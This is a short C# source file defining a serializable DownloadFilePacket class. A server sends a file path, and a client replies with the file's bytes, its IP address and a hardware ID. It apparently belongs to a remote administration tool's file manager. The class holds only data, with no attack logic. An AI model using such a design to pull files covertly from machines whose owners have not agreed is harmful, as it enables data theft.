using System;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace PacketLib.Packet
{
    [Serializable]
    public class DownloadFilePacket : IPacket
    {
        //server
        public DownloadFilePacket(string path) : base()
        {
            this.packetType = PacketType.FM_DOWNLOAD_FILE;

            this.fileName = path;
        }

        //client
        public DownloadFilePacket(byte[]file, string fileName, string baseIp, string HWID) : base() 
        {
            this.packetType = PacketType.FM_DOWNLOAD_FILE;
            this.baseIp = baseIp;
            this.HWID = HWID;

            this.file = file;
            this.fileName = fileName;
        }

        public string HWID { get; set; }
        public string baseIp { get; set; }
        public byte[] plugin { get; set; }
        public PacketType packetType { get; }
        public string status { get; set; }
        public string datePacketStatus { get; set; }

        public string fileName { get; set; }
        public byte[] file { get; set; }
        public int size { get; set; }
    }
}
